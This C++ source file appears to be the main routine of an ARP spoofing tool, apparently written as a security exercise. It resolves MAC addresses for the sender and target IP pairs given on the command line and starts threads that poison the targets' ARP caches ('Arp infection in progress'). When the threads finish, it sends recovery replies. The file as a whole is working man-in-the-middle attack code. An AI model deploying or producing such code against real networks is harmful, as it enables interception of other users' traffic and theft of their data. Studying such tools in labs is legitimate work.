#include "arp-spoof.h"

int main(int argc, char *argv[])
{
	if (argc < 4 || argc%2)
	{
		usage();
		return -1;
	}
	pthread_t *threads = (pthread_t*)malloc(sizeof(pthread_t)*(argc-2));
	map<Ip,Mac> arp_table;
	vector<pair<Ip,Ip>> flow;

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	cout << "Gathering Info ..." << endl;

	Ip a_ip = get_attacker_ip(dev);
	Mac a_mac = get_attacker_mac(dev);
	arp_table.insert({a_ip,a_mac});
	
	Mac tmp = Mac::nullMac();
	pair<Ip,Ip> tmp_flow;
	Sem_init(&sem, 0);

	int cnt = 0;
	for(int i=2;i<argc;i++)	//ip starts at index 2
	{
		Ip ip = Ip(argv[i]);
		if(i%2 == 0) tmp_flow.first = ip;
		else
		{
			tmp_flow.second = ip;
			flow.push_back(tmp_flow);
		}
		auto ret = arp_table.insert({ip,tmp}); 
		if(ret.second)
		{
			++cnt;
			Resolve_arg rarg;
			rarg = {handle,a_mac,a_ip,ip,&(ret.first->second)};
			Pthread_create(&threads[i-2],NULL,(void*(*)(void*))rt_func,(void*)(&rarg));
			Sem_wait(&sem);
		}
	}
	bool chk = false;
	for(int i=0;i<cnt;i++)
	{
		STATUS ret;
		pthread_join(threads[i],(void**)&ret);
		if(ret == NO) chk = true;
	} 
	free(threads);
	if(chk)
	{
		pcap_close(handle);
		exit(-1);
	}
	
	//Print Info
	for (auto iter = arp_table.begin() ; iter != arp_table.end(); iter++) 
	{ 
		cout << string(iter->first) << " : " << string(iter->second) << endl; 
	} 

	cout << "Arp infection in progress ..." << endl;
	signal(SIGINT,sig_handler);

	int size = flow.size();
	pthread_t* periodic = (pthread_t*)malloc(sizeof(pthread_t)*size);
	pthread_t* non_periodic = (pthread_t*)malloc(sizeof(pthread_t)*size);

	for(int i=0;i<size;i++)
	{
		Spoof_arg sarg1;
		Spoof_arg sarg2;
		sarg1 = {handle,arp_table[flow[i].first],flow[i].first,flow[i].second,a_mac,P};
		sarg2 = sarg1;
		sarg2.status = NP;
		Pthread_create(periodic+i,NULL,(void*(*)(void*))arp_infection,(void*)(&sarg1));
		//Pthread_create(non_periodic+i,NULL,(void*(*)(void*))arp_infection,(void*)(&sarg2));
		Sem_wait(&sem);
	}
	
	//relay thread
	pthread_t relay;

	for(int i=0;i<size;i++)
	{
		Pthread_join(periodic[i],NULL);
		//Pthread_join(non_periodic[i],NULL);
	}
	//Pthread_join(relay,NULL);

	//After every jobs are done -> Recover
	cout << "Recovering in progress ..." << endl;
	pthread_t* recover_t = (pthread_t*)malloc(sizeof(pthread_t)*size);
	for(int i=0;i<size;i++)
	{
		EthArpPacket p;
		init_arp(p,arp_table[flow[i].first],a_mac,
		arp_table[flow[i].second],flow[i].second,
		arp_table[flow[i].first],flow[i].first,ArpHdr::Reply);
		Relay_arg rarg = {handle,p};
		Pthread_create(recover_t+i,NULL,(void*(*)(void*))recover,(void*)(&rarg));
		Sem_wait(&sem);
	}
	for(int i=0;i<size;i++) Pthread_join(recover_t[i],NULL);


	puts("Finished!!");
	free(periodic);
	free(non_periodic);
	free(recover_t);
	pcap_close(handle);
}
